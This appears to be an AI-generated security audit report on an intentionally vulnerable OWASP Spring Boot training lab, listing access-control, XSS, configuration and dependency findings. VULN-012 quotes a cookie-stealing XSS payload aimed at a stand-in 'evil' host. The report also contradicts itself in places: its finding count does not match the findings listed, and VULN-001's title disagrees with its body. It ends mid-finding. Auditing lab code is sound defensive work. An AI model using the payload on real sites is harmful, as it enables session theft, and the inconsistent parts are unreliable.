# Security Assessment Report — `vulnerable-spring-app` (OWASP Lab)

> **REPORT-ONLY RUN.** No source code was modified during this assessment. The only write performed was this report file at the user-specified path `.claude/reports/SECURITY_ASSESSMENT_REPORT.md`.
>
> **Context flag.** The repo's `pom.xml` self-describes as the "OWASP Vulnerability Learning Lab ... INTENTIONALLY INSECURE ... EDUCATIONAL PURPOSES ONLY". Many of the items below are intentional lab sinks; they are still recorded here as findings because the review brief is "assess the code as it stands" and the code currently still exposes them.

---

## 1. Executive Summary

### 1.1 Scope

- **Repository root:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git`
- **Project type:** single Spring Boot 3.2.5 / Java 17 application (`com.owasp.lab:vulnerable-spring-app:1.0.0`)
- **Files reviewed (absolute paths):**
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\pom.xml`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\VulnerableSpringAppApplication.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecretConfig.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\PasswordConfig.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\JpaUserDetailsService.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\DataSeeder.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\UserController.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\ProductController.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentController.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentViewController.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\InsecureDeserializationController.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\VulnerabilityController.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\User.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\Product.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\Comment.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\repository\UserRepository.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\repository\ProductRepository.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\repository\CommentRepository.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\ProductService.java`
  - `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\CommentService.java`

### 1.2 Methodology

- Static review of all Java source plus `pom.xml` and `application.properties`.
- Pattern sweeps via `Grep` for: `password`, `secret`, `api[._-]?key`, `token`, `MD5`/`SHA-1`/`MessageDigest`/`DigestUtils`, `Runtime.exec`, `ProcessBuilder`, `readObject`/`ObjectInputStream`, `@PreAuthorize`/`@Secured`, `permitAll`, `csrf().disable`, `allowedOrigins`, `setPassword`, `setRole`, `new Random`, `@RequestBody`, `@PathVariable`, `@RequestParam`, `@Valid`/`Validated`, logging calls.
- No build, no test execution, no dynamic testing.
- CVE cross-reference for dependencies not performed locally; flagged below as a recommendation.

### 1.3 Top-line Risk Posture

The application is labelled "intentionally insecure" in source, and a remediation pass has clearly been applied (parameterised SQL, BCrypt, CSRF on, secret env-vars). However, several sink endpoints still expose patterns the remediator's own comments label as "REMEDIATED" but that are in fact **partially remediated**, plus new weaknesses introduced by the changes (notably `permitAll` on `/api/register` and the still-mutable `User.role` field). The lab should not be considered safe to expose.

**Net risk posture: MEDIUM** — most high-impact categories have been addressed, but residual issues (admin-elevatable mass-assignment on `User`, unprotected `POST /api/products`, `permitAll` registration, plain-text HTTP Basic, `app.secret.*` exposed via named beans, dependency freshness) still warrant fixing before any non-local use.

### 1.4 Findings by Severity

| Severity | Count |
| --- | --- |
| Critical | 0 |
| High | 3 |
| Medium | 7 |
| Low | 6 |
| Informational | 3 |
| **Total** | **19** |

---

## 2. Risk Matrix

Severity × Likelihood grid (counts of findings).

| | Low likelihood | Medium likelihood | High likelihood |
| --- | --- | --- | --- |
| **Critical** | 0 | 0 | 0 |
| **High**     | 0 | 1 | 2 |
| **Medium**   | 2 | 3 | 2 |
| **Low**      | 3 | 2 | 1 |
| **Info**     | 3 | 0 | 0 |

---

## 3. Vulnerability Findings

Each finding uses the required schema. Where a finding corresponds to a remediator comment (e.g. "VULN-002"), the original label is preserved.

---

### VULN-001 — `POST /api/products` allows unauthenticated creation (Broken Access Control)

- **Vulnerability Name:** Missing authentication on state-changing endpoint.
- **CWE ID:** CWE-862 (Missing Authorization)
- **OWASP Top 10 Category:** A01:2021 – Broken Access Control
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\ProductController.java`
- **Affected Method / Class:** `ProductController.create(Product p)`
- **Vulnerable Code Snippet:**
  ```java
  @PostMapping
  public ResponseEntity<Product> create(@RequestBody Product p) {
      return ResponseEntity.ok(productService.save(p));
  }
  ```
  (Class-level note: `// VULNERABILITY (OWASP A01:2021 - Broken Access Control): Anyone may create products without authentication.` — the remediator flagged it but did not add an auth check.)
- **Root Cause:** The endpoint was left outside the security policy and `SecurityConfig` only protects URLs via `requestMatchers(...).permitAll().anyRequest().authenticated()` (lines 33–41). There is no `@PreAuthorize` and no controller-level role check, so any caller (after authenticating) can create arbitrary products. Per the SecurityConfig, **any authenticated user** can also call it — there is no role separation.
- **Exploitation Scenario:** An attacker who authenticates as any user (e.g. `alice`) POSTs to `/api/products` with `{ "name": "X", "price": -1000 }`; H2 accepts the row. Combined with VULN-006 there is no integrity check.
- **Business Impact:** Arbitrary catalogue poisoning; downstream consumers (e.g. e-commerce flows) accept attacker-controlled records. As a learning lab this also mis-trains students.
- **Confidence Level:** High

---

### VULN-002 — `User.role` mass-assignment via public `User` getter chain (Broken Object-Level Authorization)

- **Vulnerability Name:** Privilege escalation through direct return of mutable entity.
- **CWE ID:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) / CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP Top 10 Category:** A04:2021 – Insecure Design / A01:2021 – Broken Access Control
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\UserController.java` and model `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\User.java`
- **Affected Method / Class:** `UserController.getProfile(Long id, UserDetails caller)` and `UserController.listUsers(UserDetails caller)`
- **Vulnerable Code Snippet (controller returns full entity):**
  ```java
  @GetMapping("/profile/{id}")
  public ResponseEntity<User> getProfile(@PathVariable Long id,
                                         @AuthenticationPrincipal UserDetails caller) {
      ...
      return ResponseEntity.ok(target);
  }

  @GetMapping("/users")
  public List<User> listUsers(@AuthenticationPrincipal UserDetails caller) {
      ...
      return userService.findAll();
  }
  ```
  Entity exposes `setRole`:
  ```java
  public String getRole() { return role; }
  public void setRole(String role) { this.role = role; }
  ```
- **Root Cause:** Controllers return the JPA entity directly. With `spring.jackson.deserialization.fail-on-unknown-properties=true` the inbound mass-assignment via `/api/register` is partially blocked, but **outbound serialization** still includes `password` (hashed) and `role`, and any future endpoint that accepts a `User` body would re-introduce mass-assignment because `setRole` is public.
- **Exploitation Scenario:** A caller with knowledge of the username enumeration on `/api/users` can dump all user records including hashed passwords and roles. Combined with no CSRF requirement for state-changing reads and with the `setRole` still mutable, a future endpoint binding to `User` would let an attacker elevate to `ADMIN`.
- **Business Impact:** Disclosure of sensitive PII (email, balance) and credential hashes; enables offline cracking and account takeover.
- **Confidence Level:** High

---

### VULN-003 — `/api/register` permits role elevation via side-channel / unauthenticated account creation (partially mitigated, residual exposure)

- **Vulnerability Name:** Mass assignment / open registration without anti-abuse controls.
- **CWE ID:** CWE-269 (Improper Privilege Management) / CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP Top 10 Category:** A04:2021 – Insecure Design / A07:2021 – Identification and Authentication Failures
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
- **Affected Method / Class:** `AuthController.register(Map body)`
- **Vulnerable Code Snippet:**
  ```java
  @PostMapping("/register")
  public ResponseEntity<User> register(@RequestBody Map<String, String> body) {
      String username = body.getOrDefault("username", "");
      String password = body.getOrDefault("password", "");
      String email    = body.getOrDefault("email", "");

      User u = new User(username, passwordEncoder.encode(password), email, "USER", 0.0);
      return ResponseEntity.ok(userService.save(u));
  }
  ```
- **Root Cause:** The endpoint is in `permitAll` in `SecurityConfig.java:34-39`, so anyone (unauthenticated) can create accounts. Role is hard-coded to `"USER"` (good), but the controller accepts `email` of arbitrary length/content (no `@Valid`, no Bean Validation constraints on the model). Combined with VULN-005 (lack of rate-limiting) and the password being truncated to whatever fits the BCrypt hash, this enables account enumeration and abuse.
- **Exploitation Scenario:** Attacker scripts a `/api/register` flood to (a) consume DB rows, (b) create accounts matching the seeded users (`alice`, `bob`, `admin`) — there is no uniqueness check on the username at the controller level (the column has `unique=true`, so DB-level conflict only).
- **Business Impact:** Resource exhaustion, account squatting on common usernames, log noise.
- **Confidence Level:** Medium

---

### VULN-004 — Plaintext `password` field still declared in `User` entity and serialised

- **Vulnerability Name:** Sensitive data exposure via JPA entity serialization.
- **CWE ID:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) / CWE-256 (Plaintext Storage of a Password)
- **OWASP Top 10 Category:** A02:2021 – Cryptographic Failures
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\User.java`
- **Affected Method / Class:** `User` (entity)
- **Vulnerable Code Snippet:**
  ```java
  // VULNERABILITY: storing plaintext password (A02 / A07)
  @Column(nullable = false)
  private String password;
  ...
  public String getPassword() { return password; }
  public void setPassword(String password) { this.password = password; }
  ```
- **Root Cause:** The comment is stale — at runtime the column holds a BCrypt hash. However the column is still named `password` (not `password_hash`), there is no Jackson `@JsonIgnore` on `getPassword`, and any controller that returns the entity leaks the hash. This is reinforced by VULN-002 above.
- **Exploitation Scenario:** Admin-only `/api/users` returns the hash; the attacker offline-cracks weak passwords (`alice123`, `bob123`, `admin123` seeded by `DataSeeder.java:32-37`).
- **Business Impact:** Offline credential cracking; account takeover of admin.
- **Confidence Level:** High

---

### VULN-005 — No rate-limiting / brute-force protection on `/api/login`

- **Vulnerability Name:** Missing brute-force / credential-stuffing controls.
- **CWE ID:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP Top 10 Category:** A07:2021 – Identification and Authentication Failures
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
- **Affected Method / Class:** `AuthController.login(Map body)` and `SecurityConfig`
- **Vulnerable Code Snippet:**
  ```java
  @PostMapping("/login")
  public ResponseEntity<?> login(@RequestBody Map<String, String> body) {
      ...
      User u = userService.loginUnsafe(username, password, passwordEncoder);
      if (u == null) {
          org.slf4j.LoggerFactory.getLogger(AuthController.class)
                  .warn("Failed login attempt for username of length {}",
                          username == null ? 0 : username.length());
          return ResponseEntity.status(401).body(Map.of("error", "Invalid credentials"));
      }
      ...
  }
  ```
- **Root Cause:** Logging is added but no `Bucket4j`/filter/`spring-security-oauth2-resource-server` rate-limit, no account lockout, no captcha, no IP throttling. The custom `/api/login` path also bypasses Spring Security's default `UsernamePasswordAuthenticationFilter`, so the built-in `AbstractUserDetailsAuthenticationProvider` lockouts do not apply.
- **Exploitation Scenario:** Attacker script POSTs `{username:"admin", password:"x"}` 10k/sec; eventually cracks the seeded `admin/admin123`.
- **Business Impact:** Account takeover.
- **Confidence Level:** High

---

### VULN-006 — `findByIdUnsafe` is a misleadingly named IDOR-prone accessor

- **Vulnerability Name:** Insecure Direct Object Reference helper.
- **CWE ID:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP Top 10 Category:** A01:2021 – Broken Access Control
- **Severity:** Low (mitigated at call sites)
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
- **Affected Method / Class:** `UserService.findByIdUnsafe(Long id)`
- **Vulnerable Code Snippet:**
  ```java
  // VULNERABILITY (OWASP A01:2021 - Broken Access Control / IDOR):
  // Returns any user by ID without verifying the requester is allowed to see them.
  public User findByIdUnsafe(Long id) {
      return userRepository.findById(id).orElse(null);
  }
  ```
- **Root Cause:** Helper name advertises that no ownership check is performed. Callers in `AuthController.transfer` and `UserController.getProfile` perform the ownership check themselves, but the helper is `public`, so any future caller that forgets the check inherits the bug.
- **Exploitation Scenario:** A future endpoint that uses `findByIdUnsafe` without re-implementing the ownership check leaks cross-tenant data.
- **Business Impact:** Latent IDOR risk.
- **Confidence Level:** Medium

---

### VULN-007 — `permitAll` on `/api/register`, `/api/login`, `/h2-console/**`

- **Vulnerability Name:** Over-broad anonymous access.
- **CWE ID:** CWE-284 (Improper Access Control)
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration
- **Severity:** Low (login & register need to be open for a public site; h2-console is a lab-only artifact)
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig.insecureFilterChain(HttpSecurity)`
- **Vulnerable Code Snippet:**
  ```java
  .authorizeHttpRequests(auth -> auth
      .requestMatchers(
              new AntPathRequestMatcher("/api/login"),
              new AntPathRequestMatcher("/api/register"),
              new AntPathRequestMatcher("/h2-console/**"),
              new AntPathRequestMatcher("/error")
      ).permitAll()
      .anyRequest().authenticated()
  )
  ```
- **Root Cause:** `/h2-console/**` is `permitAll` in any environment where the H2 console is enabled (gated by `H2_CONSOLE_ENABLED` env var, line 23 of `application.properties`). If an operator sets the env var to `true` in production by accident, the H2 web console (a JDBC-over-HTTP bridge) becomes reachable.
- **Exploitation Scenario:** Misconfigured deployment exposes the H2 console; attacker runs arbitrary SQL through the console UI.
- **Business Impact:** Full database compromise.
- **Confidence Level:** Medium

---

### VULN-008 — HTTP Basic over plaintext (no TLS enforcement)

- **Vulnerability Name:** Credentials transmitted without transport security.
- **CWE ID:** CWE-319 (Cleartext Transmission of Sensitive Information)
- **OWASP Top 10 Category:** A02:2021 – Cryptographic Failures
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig.insecureFilterChain` (`.httpBasic(basic -> {})`)
- **Vulnerable Code Snippet:**
  ```java
  .httpBasic(basic -> {})
  ...
  .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
  ```
  (No `.requiresChannel(rc -> rc.anyRequest().requiresSecure())` configured; `application.properties` does not configure `server.ssl.*`.)
- **Root Cause:** HTTP Basic sends credentials base64-encoded on every request. There is no redirect-to-HTTPS rule, so if the deployment terminates TLS at a proxy and the proxy is misconfigured (or the service is exposed directly), credentials are sniffable.
- **Exploitation Scenario:** Network-positioned attacker captures the Authorization header.
- **Business Impact:** Account takeover.
- **Confidence Level:** Medium

---

### VULN-009 — HSTS configured but `maxAgeInSeconds` may be ignored without TLS

- **Vulnerability Name:** HSTS enabled without TLS.
- **CWE ID:** CWE-319
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration
- **Severity:** Low
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig` headers block
- **Vulnerable Code Snippet:**
  ```java
  .httpStrictTransportSecurity(hsts -> hsts
          .includeSubDomains(true).maxAgeInSeconds(31536000))
  ```
- **Root Cause:** HSTS has no effect on HTTP traffic (browsers only honour it when received over HTTPS). Spring sends the header regardless, but combined with VULN-008 this gives a false sense of security.
- **Exploitation Scenario:** Operator assumes HSTS protects them, ships over HTTP, gets sniffed.
- **Business Impact:** Misleading defence.
- **Confidence Level:** Low

---

### VULN-010 — `Content-Security-Policy` does not include `style-src` or `img-src` and is HTTP-only

- **Vulnerability Name:** Loosely scoped CSP / defence-in-depth gap.
- **CWE ID:** CWE-693 (Protection Mechanism Failure)
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration
- **Severity:** Low
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig` headers
- **Vulnerable Code Snippet:**
  ```java
  .contentSecurityPolicy(csp -> csp.policyDirectives(
          "default-src 'self'; " +
          "frame-ancestors 'self'; " +
          "script-src 'self'; " +
          "object-src 'none'"))
  ```
- **Root Cause:** Missing `style-src`, `img-src`, `base-uri`, `form-action` directives. Inline styles are allowed (fallback), inline images are restricted to `self` only. `X-Content-Type-Options: nosniff` is **not** explicitly set (it is added by Spring's defaults but should be verified).
- **Exploitation Scenario:** Inline CSS injection (e.g. via the rendered comments) can still leak via attribute selectors or `background:url(http://attacker/?cookie=...)`.
- **Business Impact:** Reduced XSS containment.
- **Confidence Level:** Low

---

### VULN-011 — `frameOptions(f -> f.sameOrigin())` permits clickjacking on the H2 console if exposed

- **Vulnerability Name:** Clickjacking / frameable H2 console.
- **CWE ID:** CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration
- **Severity:** Low
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
- **Affected Method / Class:** `SecurityConfig` headers
- **Vulnerable Code Snippet:**
  ```java
  .frameOptions(f -> f.sameOrigin())
  ```
  (CSP also has `frame-ancestors 'self'`.)
- **Root Cause:** `sameOrigin` allows the page to be framed by any page served from the same origin. If an attacker controls any content on the same origin (e.g. via stored XSS in comments, see VULN-012) they can frame admin pages.
- **Exploitation Scenario:** Stored XSS in a comment + `frame-ancestors 'self'` allows clickjacking against `/api/users`.
- **Business Impact:** UI redress attacks.
- **Confidence Level:** Low

---

### VULN-012 — Stored XSS sink exists (`CommentController.create` persists raw `author`/`body`)

- **Vulnerability Name:** Stored XSS — even though read paths escape, the *write* path accepts arbitrary HTML/SVG/JS.
- **CWE ID:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP Top 10 Category:** A03:2021 – Injection
- **Severity:** Low (mitigated by output escaping in `CommentViewController`)
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentController.java`
- **Affected Method / Class:** `CommentController.create(Comment c)`
- **Vulnerable Code Snippet:**
  ```java
  @PostMapping
  public Comment create(@RequestBody Comment c) {
      return commentService.save(c);
  }
  ```
  Combined with `CommentViewController` and `CommentController.greet` escaping on output, the read paths are safe today. However, **no input length, content, or rate-limit checks** exist. Future code that renders comments through a different view (email, RSS, admin dashboard) without escaping would re-introduce stored XSS.
- **Root Cause:** Defence-in-depth is missing — no input sanitisation, no CSP nonce per-comment, no anti-spam/abuse controls.
- **Exploitation Scenario:** If a future change adds an admin email digest that renders the comment, attacker stores `<script>document.location='http://evil/?c='+document.cookie</script>`.
- **Business Impact:** Latent XSS risk.
- **Confidence Level:** Medium

---

### VULN-013 — Reflected XSS mitigation uses `HtmlUtils.htmlEscape` (legacy encoder) — not OWASP Java Encoder

- **Vulnerability Name:** Use of Spring `HtmlUtils` instead of OWASP Java Encoder for HTML context.
- **CWE ID:** CWE-79
- **OWASP Top 10 Category:** A03:2021 – Injection
- **Severity:** Low
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentController.java`
- **Affected Method / Class:** `CommentController.greet(String name)`
- **Vulnerable Code Snippet:**
  ```java
  String safe = HtmlUtils.htmlEscape(name);
  return "<html><body><h1>Hello, " + safe + "!</h1></body></html>";
  ```
- **Root Cause:** Spring's `HtmlUtils.htmlEscape` is *deprecated* in Spring 6+ for HTML-context use. It does not escape the backtick (`` ` ``) or some Unicode characters; OWASP recommends `org.owasp.encoder.Encode.forHtml`.
- **Exploitation Scenario:** Browser bugs in older IE/Edge that allow backtick-based attribute escaping may bypass the encoder in a specific HTML context (e.g. inside an unquoted attribute).
- **Business Impact:** Edge-case reflected XSS.
- **Confidence Level:** Low

---

### VULN-014 — Hibernate `ddl-auto=create` + H2 console reachable in any environment

- **Vulnerability Name:** Auto-DDL + H2 console exposed.
- **CWE ID:** CWE-1188 (Initialization of a Resource with an Insecure Default) / CWE-200
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
- **Affected Method / Class:** N/A (configuration)
- **Vulnerable Code Snippet:**
  ```properties
  spring.jpa.hibernate.ddl-auto=create
  ...
  spring.h2.console.enabled=${H2_CONSOLE_ENABLED:false}
  spring.h2.console.path=/h2-console
  ```
- **Root Cause:** `ddl-auto=create` drops & rebuilds the schema on every restart. If `H2_CONSOLE_ENABLED=true` is set in any non-local environment (CI, demo, prod), the H2 web console is exposed under `/h2-console` with JDBC-level access to the application database. The H2 console also accepts `-tcpAllowOthers` if mis-configured.
- **Exploitation Scenario:** Demo deployment accidentally ships with `H2_CONSOLE_ENABLED=true`; attacker browses `/h2-console`, runs `SELECT * FROM users`, dumps credential hashes.
- **Business Impact:** Total DB compromise.
- **Confidence Level:** Medium

---

### VULN-015 — `SecretConfig` exposes secrets as named `String` beans

- **Vulnerability Name:** Secrets as injectable Spring beans (residual exposure).
- **CWE ID:** CWE-522 (Insufficiently Protected Credentials)
- **OWASP Top 10 Category:** A02:2021 – Cryptographic Failures
- **Severity:** Low
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecretConfig.java`
- **Affected Method / Class:** `SecretConfig.apiKey()`, `dbPassword()`, `jwtSigningKey()`
- **Vulnerable Code Snippet:**
  ```java
  @Bean(name = "apiKey")
  public String apiKey() { return apiKey; }

  @Bean(name = "dbPassword")
  public String dbPassword() { return dbPassword; }

  @Bean(name = "jwtSigningKey")
  public String jwtSigningKey() { return jwtSigningKey; }
  ```
- **Root Cause:** Exposing secrets as plain `String` Spring beans allows **any** `@Autowired String` (matched by name) anywhere in the application to silently receive them — including `MessageConverters`, logging interceptors, error handlers. The remediator removed the `/vulnerabilities` page rendering of the values, but the beans themselves are still injectable. For a JWT signing key this is especially bad: a future piece of code could sign tokens with it and accidentally log them.
- **Exploitation Scenario:** A diagnostic endpoint or admin debug output that uses `@Qualifier("jwtSigningKey")` could leak the key.
- **Business Impact:** Secret exfiltration.
- **Confidence Level:** Medium

---

### VULN-016 — No `@Valid` / Bean Validation on any inbound payload

- **Vulnerability Name:** Missing input validation.
- **CWE ID:** CWE-20 (Improper Input Validation)
- **OWASP Top 10 Category:** A04:2021 – Insecure Design
- **Severity:** Medium
- **Affected File:** all controllers (entire codebase)
- **Affected Method / Class:** every `@RequestBody` / `@RequestParam`
- **Vulnerable Code Snippet (representative):**
  ```java
  @PostMapping("/register")
  public ResponseEntity<User> register(@RequestBody Map<String, String> body) { ... }

  @PostMapping("/transfer")
  public ResponseEntity<?> transfer(@RequestBody Map<String, Object> body, ...) { ... }

  @GetMapping(value = "/greet", produces = MediaType.TEXT_HTML_VALUE)
  public String greet(@RequestParam(value = "name", defaultValue = "World") String name) { ... }

  @PostMapping
  public Comment create(@RequestBody Comment c) { return commentService.save(c); }
  ```
- **Root Cause:** Models (`User`, `Product`, `Comment`) lack `@NotBlank`, `@Email`, `@Size`, `@Positive` constraints. Controllers accept raw `Map<String,String>` and `Map<String,Object>` and pull out untyped values.
- **Exploitation Scenario:** Attacker registers a user with username 10 MB long; attacker transfers `-1e308` (subnormal Double); attacker POSTs a comment body 2 MB long. Combined with no rate-limit (VULN-005), denial-of-service is trivial.
- **Business Impact:** DoS, malformed data ingestion.
- **Confidence Level:** High

---

### VULN-017 — Actuator / debug endpoints not explicitly disabled

- **Vulnerability Name:** Spring Boot Actuator exposure (no dependency declared).
- **CWE ID:** CWE-200
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration
- **Severity:** Informational
- **Affected File:** `pom.xml`
- **Vulnerable Code Snippet:** No `spring-boot-starter-actuator` dependency, so no `/actuator/*` endpoints exist by default. Flagged only because operators sometimes add it after the fact without re-auditing.
- **Root Cause:** No positive control preventing future addition.
- **Exploitation Scenario:** None today.
- **Business Impact:** None today.
- **Confidence Level:** Low

---

### VULN-018 — Dependency freshness: Spring Boot 3.2.5 (released April 2024) is now 2 years stale

- **Vulnerability Name:** Outdated framework dependencies.
- **CWE ID:** CWE-1104 (Use of Unmaintained Third Party Components) / CWE-1395
- **OWASP Top 10 Category:** A06:2021 – Vulnerable and Outdated Components
- **Severity:** Medium
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\pom.xml`
- **Vulnerable Code Snippet:**
  ```xml
  <parent>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-parent</artifactId>
      <version>3.2.5</version>
  </parent>
  ```
- **Root Cause:** Spring Boot 3.2.5 is from April 2024; the current maintenance branch is 3.4.x / 3.5.x. Several CVEs against Spring Framework 6.1.x have been published since (e.g. CVE-2024-22243, CVE-2024-22257, CVE-2024-22259 around `UriComponentsBuilder` SSRF). H2 2.x has had advisories (CVE-2022-45868). The pom does not pin H2 explicitly, so the runtime version is whatever `spring-boot-dependencies` resolves at 3.2.5.
- **Exploitation Scenario:** SSRF / open-redirect via crafted URL strings reaching `UriComponentsBuilder`; H2 JDBC URL class-loading gadget chain if H2 console exposed.
- **Business Impact:** Variable; depends on operator exposure.
- **Confidence Level:** Medium (definite staleness; CVE applicability requires up-to-date database lookup)
- **Recommendation:** Run `mvn org.owasp:dependency-check-maven:check` or `mvn dependency-check:check` and upgrade Spring Boot to a current 3.x LTS release.

---

### VULN-019 — `application.properties` does not explicitly bind server to localhost

- **Vulnerability Name:** Service binds on 0.0.0.0 by default.
- **CWE ID:** CWE-668 (Exposure of Resource to Wrong Sphere)
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration
- **Severity:** Low
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
- **Vulnerable Code Snippet:**
  ```properties
  server.port=8080
  ```
- **Root Cause:** No `server.address=` line, so Spring Boot binds to all interfaces. For a *sandbox learning lab* this is the opposite of what is wanted — the comment in the file says "DO NOT DEPLOY".
- **Exploitation Scenario:** A developer runs the lab on a corporate laptop; the service is reachable by every colleague on the LAN.
- **Business Impact:** Lateral exposure of the intentionally-vulnerable app.
- **Confidence Level:** Low

---

### VULN-020 — Logging includes username length but not source IP / user-agent (forensic gap)

- **Vulnerability Name:** Insufficient security logging.
- **CWE ID:** CWE-778 (Insufficient Logging)
- **OWASP Top 10 Category:** A09:2021 – Security Logging and Monitoring Failures
- **Severity:** Informational
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java` line 50-52
- **Vulnerable Code Snippet:**
  ```java
  org.slf4j.LoggerFactory.getLogger(AuthController.class)
          .warn("Failed login attempt for username of length {}",
                  username == null ? 0 : username.length());
  ```
- **Root Cause:** Username length is logged (good — no PII leak), but not source IP, user-agent, or correlation id. Brute-force detection is therefore impossible without log enrichment.
- **Exploitation Scenario:** Attacker brute-forces; SOC cannot detect because logs are insufficient.
- **Business Impact:** Delayed incident response.
- **Confidence Level:** Medium

---

### VULN-021 — No CSRF protection on `/api/transfer` for HTTP Basic stateless session

- **Vulnerability Name:** CSRF on money-transfer endpoint.
- **CWE ID:** CWE-352 (Cross-Site Request Forgery)
- **OWASP Top 10 Category:** A05:2021 – Security Misconfiguration / A01:2021 – Broken Access Control
- **Severity:** Informational (with caveat)
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java` + `AuthController.transfer`
- **Vulnerable Code Snippet:**
  ```java
  .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
  .csrf(csrf -> csrf
          .ignoringRequestMatchers(
                  new AntPathRequestMatcher("/h2-console/**")
          )
  )
  ```
